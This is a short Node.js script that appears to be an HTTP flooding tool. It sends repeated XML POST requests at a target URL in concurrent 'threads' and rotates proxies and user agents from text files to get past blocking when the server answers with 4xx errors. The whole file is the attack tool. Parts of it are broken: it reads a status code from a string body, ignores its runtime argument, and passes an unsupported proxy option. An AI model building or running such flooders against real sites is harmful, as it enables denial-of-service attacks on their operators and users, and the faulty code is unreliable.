const http = require('http');
const fs = require('fs');
const url = require('url');
const querystring = require('querystring');

const uaList = fs.readFileSync('ua.txt').toString().split('\n');
const proxyList = fs.readFileSync('proxy.txt').toString().split('\n');

const xmlData = fs.readFileSync('data.xml').toString();

const args = process.argv.slice(2);
const urlToRequest = args[0];
const runtime = args[1];
const threadCount = args[2];

let currentProxyIndex = 0;
let currentUserAgentIndex = 0;

function getRandomInt(max) {
  return Math.floor(Math.random() * Math.floor(max));
}

function sendRequest(xmlData, options) {
  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => {
        data += chunk;
      });
      res.on('end', () => {
        resolve(data);
      });
    });
    req.on('error', (error) => {
      reject(error);
    });
    req.write(xmlData);
    req.end();
  });
}

async function sendRequests() {
  const options = url.parse(urlToRequest);
  options.method = 'POST';
  options.headers = {
    'Content-Type': 'application/xml',
    'User-Agent': uaList[currentUserAgentIndex],
  };
  if (proxyList[currentProxyIndex]) {
    options.agent = new http.Agent({
      keepAlive: true,
      maxSockets: 1,
      proxy: proxyList[currentProxyIndex],
    });
  }
  const result = await sendRequest(xmlData, options);
  if (result.statusCode >= 400 && result.statusCode <= 499) {
    currentProxyIndex = getRandomInt(proxyList.length);
    currentUserAgentIndex = getRandomInt(uaList.length);
    return sendRequests();
  }
  return result;
}

async function run() {
  const startTime = new Date().getTime();
  const promises = [];
  for (let i = 0; i < threadCount; i++) {
    promises.push(sendRequests());
    await new Promise((resolve) => setTimeout(resolve, 300));
  }
  const results = await Promise.all(promises);
  const endTime = new Date().getTime();
  console.log(`Total runtime: ${endTime - startTime}ms`);
  console.log(results);
}

run();
